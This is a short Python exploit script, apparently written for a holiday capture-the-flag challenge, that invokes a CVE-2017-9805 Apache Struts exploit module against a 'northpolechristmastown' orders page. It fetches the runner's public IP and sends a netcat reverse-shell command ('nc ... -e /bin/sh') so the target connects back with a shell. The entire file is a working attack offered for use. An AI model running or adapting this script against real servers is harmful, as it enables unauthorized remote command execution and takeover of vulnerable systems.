
import cve_2017_9805
import requests

res = requests.get('https://httpbin.org/ip')
ip = res.json()["origin"]
port = 3000

command = 'nc {} {} -e /bin/sh'.format(ip, port)

print("Creating reverse shell: {} {}".format(ip, port))
print("nc -lv {}".format(port))
cve_2017_9805.main("https://dev.northpolechristmastown.com/orders.xhtml", command)
